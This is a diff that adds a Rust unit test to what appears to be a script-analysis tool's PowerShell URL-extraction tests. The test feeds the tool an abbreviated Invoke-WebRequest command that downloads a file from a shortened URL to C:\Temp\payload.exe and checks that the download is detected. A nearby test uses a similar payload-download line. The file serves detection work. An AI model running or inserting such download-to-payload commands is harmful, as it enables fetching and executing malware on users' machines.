@@ -8001,6 +8001,24 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_schemeless_uri_abbreviation_after_outfile_extracted() {
+        let ps = r#"Invoke-WebRequest -OutFile C:\Temp\payload.exe -Ur rebrand.ly/47i82k6"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://rebrand.ly/47i82k6"
+                            && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+                )
+            }),
+            "schemeless IWR -Ur after -OutFile was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_outfile_abbreviation_preserves_destination() {
         let ps = r#"IWR -useb https://iwr-outf.example/payload.js -outf C:\Temp\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
